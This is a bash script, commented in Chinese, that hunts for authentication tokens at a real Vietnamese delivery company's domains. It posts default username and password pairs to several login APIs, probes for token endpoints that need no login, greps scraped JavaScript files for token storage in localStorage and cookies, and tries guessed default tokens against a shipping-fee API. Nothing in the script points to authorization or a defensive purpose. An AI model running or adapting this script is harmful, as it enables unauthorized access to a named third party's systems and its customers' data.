#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 最终Token狩猎 - 从所有来源"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

echo "[*] 1. 尝试从login/auth API获取Token..."
AUTH_URLS=(
    "https://admin.giaohangtietkiem.vn/api/auth/login"
    "https://khachhang.giaohangtietkiem.vn/api/auth/login"
    "https://services.giaohangtietkiem.vn/api/auth/login"
    "https://hrm-api.ghtk.vn/api/login"
    "https://inter.ghtk.vn/api/login"
)

CREDS=(
    '{"username":"test","password":"test"}'
    '{"username":"demo","password":"demo"}'
    '{"email":"test@test.com","password":"password"}'
    '{"phone":"0000000000","password":"123456"}'
)

for url in "${AUTH_URLS[@]}"; do
    echo "  Testing: $url"
    for cred in "${CREDS[@]}"; do
        resp=$(curl -sk "$url" -X POST \
            -H "Content-Type: application/json" \
            -d "$cred" -m 2 2>&1)
        
        if echo "$resp" | jq -e '.token' >/dev/null 2>&1; then
            echo "    ✅✅✅ 获得Token！"
            echo "$resp" | jq .
            break 2
        fi
    done
done

echo ""
echo "[*] 2. 测试匿名访问Token生成端点..."
TOKEN_GEN_URLS=(
    "https://services.giaohangtietkiem.vn/api/token"
    "https://services.giaohangtietkiem.vn/api/auth/token"
    "https://services.giaohangtietkiem.vn/api/v1/token"
    "https://khachhang.giaohangtietkiem.vn/api/token"
)

for url in "${TOKEN_GEN_URLS[@]}"; do
    echo -n "  $url → "
    resp=$(curl -sk "$url" -m 2 2>&1)
    if echo "$resp" | jq -e '.token' >/dev/null 2>&1; then
        echo "✅ 有Token！"
        echo "$resp" | jq .
    else
        echo "❌"
    fi
done

echo ""
echo "[*] 3. 从localStorage模式搜索JS..."
echo "  → 搜索localStorage.setItem('token'..."
grep -rh "localStorage.setItem\|localStorage.getItem" dashboard_main.js fofa_discovery/sos_main.js 2>/dev/null | \
    grep -i "token\|auth" | head -10

echo ""
echo "[*] 4. 从Cookie模式搜索..."
grep -rh "document.cookie\|Cookie.set" dashboard_main.js fofa_discovery/sos_main.js 2>/dev/null | \
    grep -i "token" | head -10

echo ""
echo "[*] 5. 测试默认测试Token..."
TEST_TOKENS=(
    "test"
    "demo"
    "ghtk_demo_token"
    "sandbox_token"
    "development_token"
    "staging_token"
)

API="https://services.giaohangtietkiem.vn/services/shipment/fee"

for token in "${TEST_TOKENS[@]}"; do
    echo -n "  Token: $token → "
    resp=$(curl -sk "$API" -H "Token: $token" -m 2 2>&1)
    
    if ! echo "$resp" | grep -q "Cần cung cấp token hợp lệ"; then
        echo "⚠️  不同的响应！"
        echo "$resp" | jq . 2>/dev/null || echo "$resp"
    else
        echo "❌"
    fi
done

